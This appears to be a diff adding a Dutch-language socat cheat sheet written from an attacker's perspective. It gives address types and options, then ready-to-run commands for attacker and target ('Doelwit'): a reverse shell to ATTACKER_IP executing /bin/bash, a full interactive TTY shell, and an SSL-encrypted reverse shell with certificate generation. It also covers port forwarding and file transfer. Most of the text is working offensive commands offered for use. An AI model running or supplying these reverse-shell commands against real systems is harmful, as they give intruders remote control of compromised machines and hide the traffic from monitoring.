@@ -1,0 +1,64 @@
+# Socat — Geavanceerde socket relay (bidirectional, crypto, PTY)
+# Koppelt twee data-stromen aan elkaar — TCP, UDP, SSL, bestanden, processen
+#
+# === Syntax ===
+# socat [opties] ADRES1 ADRES2
+#
+# === Adres types ===
+# TCP:host:port           TCP verbinding naar host
+# TCP-LISTEN:port         TCP listener
+# UDP:host:port           UDP verbinding
+# UDP-LISTEN:port         UDP listener
+# EXEC:cmd                Voer commando uit
+# STDIN                   Standaard input
+# STDOUT                  Standaard output
+# FILE:path               Bestand lezen/schrijven
+# OPENSSL:host:port       SSL/TLS verbinding
+# OPENSSL-LISTEN:port     SSL/TLS listener
+#
+# === Belangrijkste opties ===
+# fork            Accepteer meerdere verbindingen
+# reuseaddr       Hergebruik adres (bij listen)
+# bind=IP         Bind aan specifiek IP
+# cert=FILE       SSL certificaat (PEM)
+# verify=0        Skip SSL verificatie
+# pty,stderr,setsid,sigint,sane  Volledige TTY shell
+#
+# === Voorbeelden ===
+
+# === Reverse shell ===
+# Attacker (listener)
+socat TCP-LISTEN:443,reuseaddr,fork STDOUT
+
+# Doelwit (Linux)
+socat TCP:ATTACKER_IP:443 EXEC:/bin/bash
+
+# === Volledige interactieve TTY shell ===
+# Attacker
+socat file:`tty`,raw,echo=0 TCP-LISTEN:443
+
+# Doelwit
+socat TCP:ATTACKER_IP:443 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+
+# === Encrypted reverse shell (SSL) ===
+# Certificaat genereren
+openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
+cat key.pem cert.pem > shell.pem
+
+# Attacker (SSL listener)
+socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0,fork STDOUT
+
+# Doelwit
+socat OPENSSL:ATTACKER_IP:443,verify=0 EXEC:/bin/bash
+
+# === Port forwarding ===
+socat TCP-LISTEN:8080,fork TCP:TARGET:80
+
+# === File transfer ===
+# Ontvanger
+socat TCP-LISTEN:4444,reuseaddr FILE:output.exe,create
+
+# Verzender
+socat TCP:TARGET:4444 FILE:input.exe
+
+# Noot: socat is krachtiger dan netcat maar niet standaard geinstalleerd
